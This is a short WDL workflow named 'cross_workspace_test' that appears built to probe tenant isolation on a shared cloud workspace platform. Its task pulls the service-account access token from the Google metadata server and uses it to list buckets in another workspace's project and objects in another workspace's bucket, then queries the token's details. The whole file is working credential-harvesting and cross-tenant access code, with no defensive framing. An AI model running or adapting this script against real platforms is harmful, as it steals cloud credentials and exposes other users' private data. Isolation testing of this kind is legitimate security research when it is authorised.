version 1.0

workflow cross_workspace_test {
    call probe
}

task probe {
    command <<<
        TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
          | python3 -c "import json,sys; print(json.loads(sys.stdin.read())['access_token'])")

        echo "=== List buckets from other workspace project ==="
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://storage.googleapis.com/storage/v1/b?project=wb-sparkly-turnip-3673"

        echo "=== List objects in other workspace bucket ==="
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://storage.googleapis.com/storage/v1/b/bucket-alecksey-wb-blinding-truffle-4390/o"

        echo "=== Token info ==="
        curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN"
    >>>

    runtime {
        docker: "gcr.io/cloud-builders/curl"
    }

    output {
        String result = read_string(stdout())
    }
}
